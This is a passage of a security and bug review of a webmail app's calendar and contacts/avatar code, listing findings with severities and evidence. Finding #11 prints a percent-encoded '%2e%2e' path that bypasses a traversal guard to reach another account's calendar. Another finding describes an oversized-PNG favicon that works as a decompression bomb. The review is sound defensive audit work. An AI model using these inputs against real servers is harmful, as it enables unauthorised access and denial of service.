**Description.** collectDates (217-231) and the RECURRENCE-ID parse (279-287) turn values into wall keys with `timeToWall(v)` and drop the value's zone. Occurrences are keyed in the master's DTSTART zone. RFC 5545 allows EXDATE and RECURRENCE-ID in UTC or another TZID, and some producers do this. Such a value never matches its occurrence. On rebuild, buildVEvent writes the UTC wall time with the master's TZID (line 697), which makes the corruption permanent.

**Failure scenario.** Verified: with DTSTART;TZID=Europe/Berlin:...T090000 and EXDATE:20260106T080000Z (the same instant), the Jan 6 occurrence is still shown, and after a rebuild it is written as 'EXDATE;TZID=Europe/Berlin:20260106T080000'. A RECURRENCE-ID given in Z shows both the original occurrence and the moved one: 6 instances where 5 are expected.

**Evidence.**

```
ics.ts:223 `keys.push(wallKey(timeToWall(v), allDay));`
ics.ts:284 `recurrenceId = wallKey(timeToWall(rid), ridIsDate);`
ics.ts:697 `if (wc) lines.push(dtLine('EXDATE', data, wc));`
```

### calendar-server#8: Saving an event from the modal resets every attendee's RSVP and name, and 'this and following' makes the user the ORGANIZER of someone else's meeting

- **Severity:** medium · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/service.ts:257`

**Description.** The modal sends attendees as bare `{ email }` (EventModal.svelte:305). The server takes payload.attendees as-is (ics.ts:805), without merging PARTSTAT/CN/ROLE from the stored attendees with the same email. buildVEvent then writes PARTSTAT=NEEDS-ACTION;RSVP=TRUE for everyone (ics.ts:716-718), including the user's own ACCEPTED. In the 'following' split, the new series' organizer is `payload.attendees?.length ? {email: userEmail} : master.organizer`. Any received invitation with guests therefore becomes a series 'organized' by the user. The 'all' path, by contrast, correctly prefers master.organizer (276-278). If the server does implicit scheduling (RFC 6638), this could send new invitations from the user to the real organizer and every guest.

**Failure scenario.** The user accepted a meeting from their boss and changes its title, or edits 'this and following', from the modal. The stored copy now shows every guest, including the user, as NEEDS-ACTION, so the invitation card loses the 'Yes' state. In the split case, the new series has ORGANIZER set to the user's address and lists the boss as an attendee.

**Evidence.**

```
service.ts:256-258 `organizer: payload.attendees?.length ? { email: userEmail, name: organizerName } : master.organizer`
ics.ts:805 `attendees: payload.attendees ?? []`
ics.ts:717 `params.push(`PARTSTAT=${a.partStat ?? 'NEEDS-ACTION'}`)`
```

### calendar-server#9: Every write, including deleting one occurrence, rebuilds the VEVENT and drops all properties the UI doesn't model

- **Severity:** medium · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/ics.ts:665`

**Description.** updateEvent and deleteEvent always rewrite the object through buildIcs, even for an instance edit or delete, where the master itself did not change. buildVEvent only writes a fixed list of properties. URL, ATTACH (e.g. Google Drive files), CATEGORIES, CONFERENCE, COLOR, X-ALT-DESC (HTML description), X-GOOGLE-CONFERENCE / X-MICROSOFT-* , ORGANIZER SENT-BY, ATTENDEE CUTYPE/EMAIL/DELEGATED-*, VTIMEZONE blocks, EMAIL/AUDIO alarms (turned into DISPLAY), absolute and RELATED=END alarms, and alarms after the start are all lost. The header comment admits that only 'essentials' survive. A safer approach is to patch the parsed ical.js component (as patchInvitationForImport already does) instead of regenerating it.

**Failure scenario.** The user deletes one occurrence of a recurring Teams or Google Meet series they were invited to. The whole master loses its conference properties, attachments, HTML description and email alarms on the server, and every synced device sees the stripped version.

**Evidence.**

```
service.ts:347 `await putObject(auth, href, buildIcs(next, overrides), obj.etag);` (instance delete rebuilds master)
ics.ts:665-730 buildVEvent emits only UID/DTSTAMP/RID/DTSTART/DTEND/SUMMARY/DESCRIPTION/LOCATION/RRULE/EXDATE/RDATE/STATUS/TRANSP/CLASS/CREATED/SEQUENCE/ORGANIZER/ATTENDEE/VALARM(DISPLAY)
```

### calendar-server#10: 'This and following' and calendar moves are not atomic: the new series is created before the conditional write, so a 412 leaves duplicates

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/service.ts:261`

**Description.** In the 'following' path, the new series is PUT first (line 261), and the original is truncated afterwards with If-Match (line 267). If the object changed on another device, the truncation fails with 412. The route turns that into 409 'reload and try again', but the new series already exists, so the user sees every following occurrence twice. Each retry creates another series with a fresh UUID. The calendar move (303-308) creates the copy and then does an unconditional DELETE with no If-Match, which can discard a change made on another device between the GET and the DELETE. The 'splitDate <= masterStartMs' branch (265) also deletes without an etag.

**Failure scenario.** A phone edits the series' alarm while the user drags the Nov 10 occurrence with 'this and following'. The PUT at 267 gets 412, and the UI reports a conflict. After a reload, the original series (untruncated) and a new series both cover Nov 10 onward. Retrying adds a third copy.

**Evidence.**

```
service.ts:261 `await putObject(auth, newHref, buildIcs(newData), null);`
service.ts:267 `await putObject(auth, href, buildIcs(truncated, keptOverrides), obj.etag);`
service.ts:306-307 `putObject(... null); await deleteObject(auth, href);`
```

### calendar-server#11: idToHref's '..' guard can be bypassed with %2e%2e, which fetch normalizes into a path outside the calendar home

- **Severity:** low · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/caldav.ts:523`

**Description.** idToHref rejects a literal '..' and then checks that the percent-decoded href starts with the decoded home. `/dav/cal/u%40x.com/%2e%2e/victim%40x.com/default/` has no literal '..' and its decoded form starts with the home, so it is accepted. The WHATWG URL parser behind fetch treats %2e%2e as a '..' segment, and the request goes to /dav/cal/victim%40x.com/default/. The request still uses the user's own credentials, so Stalwart's ACLs are the real boundary. This only defeats the defence-in-depth check the function's comment promises ('a forged id can't reach other accounts' collections').

**Failure scenario.** Verified: idToHref(hrefToId('/dav/cal/u%40x.com/%2e%2e/victim%40x.com/default/'), 'u@x.com') returns the href, and new URL() resolves its pathname to '/dav/cal/victim%40x.com/default/'. PATCH/DELETE /api/calendar/events/<forged id> then targets another principal's collection. This only matters where the user's credentials have rights there, such as shared calendars.

**Evidence.**

```
caldav.ts:523 `if (href.includes('..')) return null;`
caldav.ts:525-527 decoded startsWith check passes for `%2e%2e`
```

### calendar-server#12: An all-day series with a date-time RECURRENCE-ID shows its override twice

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/ics.ts:591`

**Description.** The main loop normalizes override keys for all-day masters (normKey, line 481) and records the normalized key in emittedOverrideKeys. The 'moved overrides' loop then checks the raw `o.recurrenceId` (line 590-591) and the raw key against exdates. A date-time RECURRENCE-ID ('20260106T000000') on an all-day master never matches '20260106', so the override is emitted a second time. The comment at 478-480 says this sloppy-producer case was meant to be handled.

**Failure scenario.** Verified: an all-day DAILY;COUNT=5 series with an override 'RECURRENCE-ID:20260106T000000' expands to 6 instances, with '2026-01-06 override' appearing twice.

**Evidence.**

```
ics.ts:590-591 `const key = o.recurrenceId as string; if (emittedOverrideKeys.has(key)) continue;` (not passed through normKey)
```

### calendar-server: minor notes

- src/lib/server/calendar/ics.ts:624-641 — foldLine counts UTF-16 code units, not octets, despite its '74 octets' comment. Arabic summaries produce lines of about 138 octets (verified), above RFC 5545's 75-octet SHOULD.
- src/lib/server/calendar/caldav.ts:97-105 — davRequest has no timeout (other server code uses AbortSignal.timeout). A hung Stalwart DAV endpoint stalls every calendar API call and the poll loop until undici's default 300s timeout.
- src/lib/server/calendar/caldav.ts:153-159 — textProp returns null when <calendar-data> carries attributes (RFC 4791 allows content-type/version), because fast-xml-parser then produces an object. Every object would be silently skipped with partial=false. Numeric character references such as &#13; are also not decoded (verified). Stalwart-only today, but brittle.
- src/lib/server/calendar/caldav.ts:271-274 — resolveCalendarHome caches the constructed fallback forever when both the probe and discovery fail transiently, so a network blip at first use permanently breaks the login≠email deployments discovery exists for, until the process restarts.
- src/routes/api/calendar/calendars/+server.ts:39, calendars/[id]/+server.ts:23,48 and imip.ts:169 (importInvitation) — these use calendarHref without calling resolveCalendarHome first. After a server restart they target the constructed path on deployments that need discovery.
- src/routes/api/email/[id]/invitation/+server.ts:27 and calendar/invitation/+server.ts:38 — the .ics blob is downloaded and parsed with no size cap, automatically whenever an email with an .ics attachment is opened. A large attachment from any sender ties up the event loop and memory. Consider a cap of about 1 MB.
- src/lib/server/calendar/validate.ts:38-42 — rrule and attendee sub-fields (freq, until, byDay, role, partStat, name) are not validated. A non-string `until` throws inside buildRRuleString (giving a 502), and raw strings are written into ROLE=/PARTSTAT=/FREQ= without escaping.
- src/lib/server/calendar/service.ts:256 — the 'following' split does not adjust COUNT. A COUNT=10 series split at occurrence 6 gets a new series with COUNT=10 again, 15 occurrences in total.
- src/lib/server/calendar/import.ts:71-73 — events without a UID get randomUUID(), so re-importing the same file duplicates them. This contradicts the header comment ('importing the same file again updates its events'). A content-hash UID would make it idempotent.
- src/lib/server/calendar/imip.ts:106-116, 66 — only the account login address is matched as an attendee. Invitations sent to an alias or identity get no RSVP buttons, and PARTSTAT is never patched. RSVP also never sends an iTIP REPLY to the organizer unless Stalwart does implicit scheduling, which the README's 'RSVP card' wording does not make clear.
- src/lib/server/calendar/tz.ts:136 — the offset cache is bucketed by UTC hour, assuming transitions happen on the hour. Zones with :30 offsets that observe DST (Australia/Adelaide, America/St_Johns, Lord Howe) switch at hh:30 UTC, so a wall time within 30 minutes of a transition can get the other offset. The cache is also unbounded.
- src/lib/server/calendar/ics.ts:179-182 — a timed-event DURATION such as P1D is applied as an exact 86400 s, not a nominal day, so it is off by an hour across DST (RFC 5545 §3.3.6).
- src/lib/server/calendar/caldav.ts:357 — renameCalendar treats a 207 as success even when the propstat reports 403 for displayname. deleteCalendar likewise ignores per-member failures in a 207.
- src/routes/api/calendar/calendars/[id]/+server.ts:21 — `body.name.trim()` throws on a non-string (giving a 502), and there is no 100-character limit on rename unlike POST. calendar-meta.ts:60 cannot reset a colour to the default, because null means 'unchanged'.
- src/lib/server/calendar/caldav.ts:483-484 — putObject treats an etag of null as 'create only' (If-None-Match: *). If a GET ever returns no ETag (or a proxy turns it into a weak W/ etag), every update fails with a permanent 412, shown as 'Event changed on the server'.
- tests/caldav-discovery.mjs:21 — `npm run test:caldav` (documented in the README) spawns /tmp/mock-stalwart.mjs, which is not in the repo, so the test cannot run on a fresh clone. tests/ics-qa.mjs passes (verified) but is not part of the vitest suite.

## Slice: contacts-avatars-push

Files read: 43. Skipped: none.

### contacts-avatars-push#1: Senders on freemail domains (gmail.com, outlook.com, icloud.com, ...) all get the provider's logo, and Gravatar is never reached

- **Severity:** medium · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/lib/server/avatars/index.ts:122`

**Description.** compute() always tries the domain-level asset (BIMI, then favicon) before the per-address Gravatar, and there is no exclusion list for shared mailbox providers. For any sender at gmail.com, resolveFavicon('gmail.com') fetches https://gmail.com/, which redirects to Google's Gmail page, and safeFetch follows the redirect. That returns a Gmail/Google icon, which is cached as `domain:gmail.com` for 30 days. Every personal correspondent on Gmail, Outlook/Hotmail, Yahoo, iCloud, Proton and similar providers therefore shows the same provider logo. resolveGravatar is effectively dead code for most private senders. It also makes impersonation look more convincing: a phishing mail from "Google Account Team <anything@gmail.com>" really does come from gmail.com, so it passes DMARC and still gets the Google mark as its avatar. Neither the README ('BIMI, site favicons and Gravatar') nor the commit history mentions this as a deliberate choice.

**Failure scenario.** A friend writes from alice@gmail.com, and a scammer writes from 'Google Security <g.security.team@gmail.com>'. Both rows show the Gmail logo. Alice's own Gravatar is never requested because domainAssetCoalesced('gmail.com') returns 'found'.

**Evidence.**

```
index.ts:122-129
  let fromDomain = await domainAssetCoalesced(domain);
  if (!fromDomain) { const root = registrableDomain(domain); ... }
  if (fromDomain) return fromDomain;
  return gravatarAsset(email);   // only reached when the domain has no icon at all
resolve.ts:361 safeFetch(`https://${domain}/`) follows redirects (net.ts:153-165)
```

### contacts-avatars-push#2: Brand logos (BIMI/favicon) are attached by From-domain alone, with no authentication, and subdomains inherit the parent's mark

- **Severity:** medium · **Kind:** security · **Reviewer confidence:** medium
- **Location:** `src/lib/server/avatars/resolve.ts:280`

**Description.** The avatar endpoint gets only an address string (/api/avatar?email=). It resolves BIMI and favicons for that domain whether or not the message carrying it passed SPF/DKIM/DMARC. BIMI exists specifically to show a logo only for DMARC-authenticated mail. Here a spoofed From: of a brand with p=none, or mail that Stalwart delivered despite a DMARC failure, gets the brand's verified logo. compute() also falls back from an exact subdomain with no site to registrableDomain(), which uses a short hand-written suffix list rather than the PSL. As a result, tenant-style subdomains on shared platforms inherit the platform owner's icon. The comment calls BIMI 'the gold standard for company marks', but the gate that makes it trustworthy is missing.

**Failure scenario.** Mail spoofing billing@brand-with-p-none.com lands in the Inbox. The list row shows the brand's official BIMI SVG, which makes the phish look verified. Likewise, x@tenant.<shared-platform> with no website of its own shows the platform's logo through the registrable-domain fallback.

**Evidence.**

```
routes/api/avatar/+server.ts:51-56: only `email` is used, with no message or Authentication-Results context
resolve.ts:280-295 resolveBimi(domain) has no DMARC check
index.ts:123-126 falls back to registrableDomain(domain)
resolve.ts:206-231 MULTI_LABEL_TLDS is 'Not the full Public Suffix List'
```

### contacts-avatars-push#3: Transient network/DNS failures are cached as 'no avatar' for 7 days, for both the domain and the address

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/avatars/index.ts:77`

**Description.** safeFetch returns null for every kind of failure: DNS error, timeout, connection reset, 404, or an empty body. resolveBimi, resolveFavicon and resolveGravatar collapse these into the same null. domainAsset() and gravatarAsset() then call store(key, null), which writes a 'missing' row that isFresh() honours for MISSING_TTL_MS (7 days). So a short outage poisons the cache for every sender looked up during it. Examples are the homelab's uplink dropping, DNS not ready at container start, or Cloudflare DoH also unreachable. Both the domain row and the per-address gravatar row are affected, so the next week of visits shows initials. The prefetch worker makes this worse: it resolves every visible sender on each list render, so one blip covers a whole screen.

**Failure scenario.** The server's internet is down for 2 minutes while the inbox renders 50 rows. The prefetch queue resolves every sender, each safeFetch returns null, and 50 `domain:*` rows plus N `gravatar:*` rows are written as 'missing'. For the next 7 days those senders show initials, even though /api/avatar returns 204 no-store each time.

**Evidence.**

```
index.ts:77-78
  const resolved = (await resolveBimi(domain)) ?? (await resolveFavicon(domain));
  store(key, resolved);   // null -> {status:'missing'} for 7 days
net.ts:126-129 / 149-151: `catch { return null; }` for DNS and fetch errors, the same as for a 404
```

### contacts-avatars-push#4: Renaming a contact rewrites name.full but keeps the old name.components, so CardDAV clients keep (and can restore) the old name

- **Severity:** medium · **Kind:** data-loss · **Reviewer confidence:** medium
- **Location:** `src/lib/server/contacts.ts:214`

**Description.** contactPatchFromInput copies the existing name object, replaces only `full`, and leaves `components` (given, surname, ...) untouched. A test (contacts.test.ts 'preserves structured ... data') explicitly expects that renaming 'Ada Lovelace' to 'Ada Byron' leaves components Ada/Lovelace. Stalwart serves the card over CardDAV with FN taken from `full` and N taken from `components`. Apple Contacts and most phone address books display and edit the structured N fields. The result is a card whose FN and N disagree. The rename does not appear on the iPhone, and the next edit there regenerates FN from the stale N, which silently reverts the change. The aim of preserving unexposed data is sound, but components describe the same value as `full` and become wrong as soon as `full` changes.

**Failure scenario.** In Zajel, the user renames 'Ada Lovelace' (synced from an iPhone, so it has N:Lovelace;Ada) to 'Ada Byron'. The patch is name:{full:'Ada Byron', components:[given Ada, surname Lovelace]}. The iPhone still lists 'Ada Lovelace'. The user edits her phone number on the iPhone, which writes FN back from N, and Zajel shows 'Ada Lovelace' again.

**Evidence.**

```
contacts.ts:214-216
  const mergedName = { ...(existing.name ?? {}) };
  delete mergedName.full;
  if (name) mergedName.full = name;   // components kept even when name changed
```

### contacts-avatars-push#5: Favouriting an existing contact sends a 'keywords/favorite' patch path into a property most cards don't have

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/lib/server/contacts.ts:229`

**Description.** The update patch always includes 'keywords/favorite': true|null. Cards created by this app with favorite=false have no `keywords` property at all (contactCreateFromInput only adds it when favourited), and cards synced from phones usually have none either. RFC 8620 §5.3 requires every part of a patch path before the last to already exist, otherwise invalidPatch. This codebase has already hit exactly this in Stalwart: setListMembers writes the whole `members` map because 'a members/<uid> patch into it is what Stalwart rejected' (api/contacts/+server.ts:239-241, commit 9e9ae21). Ticking Favorite in the edit form on such a contact will therefore be rejected. The user sees 'The contact change was rejected by the server' or 'One or more contact fields were rejected'. Favourites aren't shown anywhere else in the UI, which would explain why nobody has noticed. If Stalwart also rejects the null removal of a missing parent, every edit of a non-favourite contact fails. I could not check this against a live Stalwart, so it needs a quick manual test.

**Failure scenario.** The user opens a contact created in Zajel (no `keywords`), ticks Favorite and clicks Save. ContactCard/set returns notUpdated with type invalidPatch or invalidProperties, and the save fails with 'Contact change was rejected'.

**Evidence.**

```
contacts.ts:229  'keywords/favorite': favorite ? true : null,
contacts.ts:261  ...(favorite && { keywords: { favorite: true } }),   // create only adds keywords when true
+server.ts:239-241 comment: 'JMAP rejects a patch path into a property that doesn't exist yet (RFC 8620 §5.3)'
```

### contacts-avatars-push#6: Contacts loading fetches every card with every property, scans the whole book again just for lists, and import rescans it per 50-contact batch

- **Severity:** medium · **Kind:** performance · **Reviewer confidence:** medium
- **Location:** `src/lib/jmap/contacts.ts:120`

**Description.** queryCards issues ContactCard/get with no `properties`, so every card comes back whole. That includes `media` (Stalwart turns vCard PHOTO into data: URIs) and any other bulky fields, although the UI only uses id/uid/kind/name/emails/phones/organizations/notes/keywords/addressBookIds/members. On top of that, loadContactsPage runs queryContactLists (a full scan of every card) whenever position===0. That means every Contacts page load (loadAllContacts then walks all pages again, so the book is read twice), every search submit, every composer address-book refresh and every Import dialog open. The import endpoint also calls queryAllContacts (another full scan) once per 50-contact batch, even though the client has already classified duplicates against a fresh full load. The full payload also goes into the SSR page data.

**Failure scenario.** An address book of 2,000 iPhone-synced contacts with ~50 KB photos: opening /contacts transfers about 100 MB of card JSON from Stalwart, twice, and serializes it into the page. Importing 2,000 contacts makes 40 batches, each re-reading 20+ pages of full cards.

**Evidence.**

```
contacts.ts:120-127 ['ContactCard/get', { accountId, '#ids': ... }]  // no properties
contacts-load.ts:41 position === 0 ? queryContactLists(client, accountId) : ...  // full scan, even with a search query
api/contacts/+server.ts:135 const existingContacts = await queryAllContacts(client, accountId);  // per batch
```

### contacts-avatars-push#7: No pixel-dimension cap on served avatars, so a sender-controlled favicon can be a decompression bomb

- **Severity:** low · **Kind:** security · **Reviewer confidence:** medium
- **Location:** `src/lib/server/avatars/resolve.ts:393`

**Description.** Only the byte size is capped (256 KB). imageSize() already parses the header dimensions, but resolveFavicon uses them only to rank candidates and prefers the largest. A favicon or apple-touch-icon controlled by the sender's domain can be a 256 KB PNG that declares 40000x40000 pixels (it compresses extremely well). The image is cached for 30 days and served to every client. There, SenderAvatar.pickPlate draws it to a canvas, which forces a full decode on every row that shows that sender. That can mean multi-GB allocations or a tab/PWA crash, especially on phones. BIMI SVGs have no structural limits either. Rejecting raster candidates above about 1024 px per side and keeping rasters only within a sane range would close this cheaply.

**Failure scenario.** An attacker sends mail from a domain whose /apple-touch-icon.png is a 250 KB PNG declaring 40000x40000. imageSize returns 40000, which is >= IDEAL_SIZE, so it wins and is cached. Every inbox render then decodes a 6.4 GB bitmap in the user's browser.

**Evidence.**

```
resolve.ts:393-398 const size = imageSize(...); if (!best || size > best.size) best = ...; if (size >= IDEAL_SIZE) break;
Verified in the scratch copy: imageSize(<PNG IHDR 40000x40000>, 'image/png') === 40000, accepted
```

### contacts-avatars-push#8: sniffImage treats any document with '<svg' in its first 1 KB as SVG, so an SPA's index.html wins as an 'infinite-resolution' favicon

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/avatars/image.ts:238`

**Description.** The SVG check is just head.includes('<svg') over the first 1024 bytes. Many SPA hosts (Netlify, Vercel, Cloudflare Pages with an SPA rewrite) answer /favicon.svg with index.html and status 200. A common modern index.html carries an inline data:image/svg+xml favicon or an inline <svg> near the top. resolveFavicon ignores the response Content-Type, accepts the HTML as image/svg+xml, gives it size Infinity, and stops searching (size >= IDEAL_SIZE). The real apple-touch-icon.png is never tried. The HTML is then cached as 'found' for 30 days and fails to render in <img>, so the user sees initials instead of the site's icon.

**Failure scenario.** For a domain whose homepage is an SPA with `<link rel="icon" href="data:image/svg+xml,<svg ...>">` in <head>: the data: candidate is rejected, /favicon.svg returns index.html with 200, sniffImage returns 'image/svg+xml' and imageSize returns Infinity. The loop breaks before /apple-touch-icon.png.

**Evidence.**

```
image.ts:238-239 const head = bytes.toString('utf8', 0, 1024).toLowerCase(); if (head.includes('<svg')) return 'image/svg+xml';
Verified in the scratch copy: sniffImage(Buffer.from('<!doctype html><html><head>...<link rel="icon" href="data:image/svg+xml,<svg ...>">')) === 'image/svg+xml'
```

### contacts-avatars-push#9: setListMembers is an unguarded read-modify-write of the whole members map, so concurrent changes lose members

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/api/contacts/+server.ts:242`

**Description.** The handler reads the list card, edits `members` in memory, and writes the whole map back without ifInState or any other concurrency check. Two overlapping requests on the same list both read the old map, and the second write drops the first one's member. Overlap is easy to get from: adding two contacts to the same list in quick succession (the UI is optimistic and doesn't serialize), a create while a list is open (saveContact fires setMembership in the background), or an iPhone editing the same group over CardDAV. The UI still shows both members until the next reload, so the loss is silent.

**Failure scenario.** The user adds contact A to 'Family', then immediately selects B and adds B to 'Family'. Request 1 reads {} and request 2 reads {}. Request 1 writes {A} and request 2 writes {B}. After reload, A is no longer in the list.

**Evidence.**

```
+server.ts:242-247
  const members = listMembers(existing);
  for (const uid of add) members[uid] = true; ...
  await updateContact(client, accountId, id, { members: ... });  // no ifInState
```

### contacts-avatars-push#10: Composer address book is a global module store: not reset on account switch and not refreshed after contact edits

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/stores/addressBook.ts:17`

**Description.** loadAddressBook caches one Directory for 5 minutes with no account key. Account switching is a client-side goto('/inbox', { invalidateAll: true }) (ProfileCard.svelte:37), so the module state survives. For up to 5 minutes after switching, recipient suggestions, list expansion and chip names come from the previous account's address book. ContactsApp keys its own cache per account (`lastLists` by activeAccountId), but this store does not. Creating, editing, importing or deleting contacts in the Contacts page doesn't invalidate it either, so a contact just added isn't suggested.

**Failure scenario.** The user composes from account A, switches to account B, and starts a new message. Typing 'fam' suggests account A's 'Family' list and expands it to A's members' addresses.

**Evidence.**

```
addressBook.ts:10-18
  const store = writable<Directory>(...); let loadedAt = 0;
  if (Date.now() - loadedAt < FRESH_MS) return Promise.resolve();   // no account key
```

### contacts-avatars-push#11: Turning notifications off on one device silently stops push to every device

- **Severity:** low · **Kind:** ux · **Reviewer confidence:** high
- **Location:** `src/routes/(app)/settings/notifications/+page.svelte:214`

**Description.** The toggle saves an account-wide pref ({enabled:false}) and unsubscribes only this device. The push worker gates on that same account-level pref (worker.ts:58-61 wantsNotifications) for every subscription. Muting the laptop therefore also stops lock-screen pushes on the phone, with no indication on the phone. The page itself treats permission as per-device ('each device needs its own permission'), so users will reasonably expect the off switch to be per-device too. Deleting only this device's subscription, and keeping the account pref for the global switch, would match that expectation.

**Failure scenario.** The user turns notifications off in the desktop browser to stop duplicate toasts. Their iPhone Home Screen app stops receiving new-mail pushes until they turn it back on from some device.

**Evidence.**

```
+page.svelte:213-219 enabled = next; await save({ enabled: next }, 'enabled'); ... else await unsubscribePush();
worker.ts:58-61 return prefs.notifications === 'on' ? prefs : null;  // gates all devices
```

### contacts-avatars-push: minor notes

- src/lib/server/avatars/net.ts:153-165: 3xx responses are never drained or cancelled (res.body left open) before following the redirect; undici holds those sockets until GC. Call res.body?.cancel().
- src/lib/server/avatars/net.ts:79,134: the DNS lookup runs before the per-hop timer and has no timeout, and each redirect hop gets a fresh 3.5 s timer. A tarpitting sender domain can hold one resolveFavicon for roughly 90 s (home page plus 5 icons, times hops) and occupy the 4 prefetch slots (index.ts:155).
- src/lib/server/avatars/net.ts:49: the link-local check only covers fe80:, not all of fe80::/10 (fe90-febf). IPv6 URL literals are blocked only by accident, because isIP('[::1]') fails on the brackets and lookup then fails. Worth making explicit.
- src/lib/server/avatars/store.ts: avatar_cache is never pruned. Every distinct spam sender adds a `gravatar:<email>` row and every new domain up to 256 KB. Consider pruning by fetched_at.
- src/lib/server/db/migrations/007_avatars.sql comment says gravatars are requested at <=160px; resolve.ts:414 uses s=256.
- src/lib/server/avatars/resolve.ts:313-327: relative icon hrefs are resolved against https://<domain>/ instead of the post-redirect URL, <base href> is ignored, unquoted rel=icon is missed, and rel="mask-icon" (a monochrome pin SVG) scores 10 and can win over the real icon.
- src/lib/server/push/send.ts:82-84: vapidKeys()/listPushSubscriptions run outside the try, so 'Never throws' isn't true. worker.ts:428 calls it as `void sendPushToUser(...)` in a timer, which would become an unhandled rejection on a DB error.
- src/lib/server/push/worker.ts:125-126: if auth() returns null the run loop exits but the watcher stays in s.watchers, so refreshPushWatchers never replaces it, even after the account is re-linked under the same id.
- src/lib/contacts/import.ts:84: one out-of-range PREF throws and aborts the whole file instead of marking that card invalid (the behaviour is tested, but harsh for large exports).
- src/lib/contacts/import.ts:172: ORG components are joined with spaces ('Acme Inc;Sales' becomes 'Acme Inc Sales'), and vCard 4 KIND:group cards are imported as people named after the group.
- src/lib/contacts/import.ts:72-77: legacy Google CSV marks the primary entry's type as '* Work' / '* Home'. parameterValues keeps the '* ' prefix, so the type becomes 'other' and the primary marker isn't mapped to pref. Low confidence: also check a fresh Google export, since some reports describe newer 'First Name'/'Label' headers that hasIdentityHeader would reject; my web search did not confirm this.
- src/lib/components/contacts/ImportContactsModal.svelte:12: the 5 MB file limit counts inline PHOTO data that the parser discards anyway, so Apple exports with photos often exceed it.
- src/lib/contacts/model.ts:64-70: contactDisplayName ignores name.components, so a card with only structured name parts shows as its org/email or 'Unnamed contact'.
- src/lib/contacts/model.ts:118-119: groupContactsAlphabetically creates separate headers for 'E' and 'É' (the collator sorts them together), and charAt(0) on an astral character yields a lone surrogate, which ends up under '#'.
- src/routes/api/contacts/+server.ts:189-205: the 'update' and 'delete' actions don't check kind !== 'group', so the person form can be pointed at a list card. Harmless today, but inconsistent with the list actions' guard.
- src/lib/components/contacts/ContactsApp.svelte:216: a contact created while a search is active is appended to the filtered result even if it doesn't match the query.
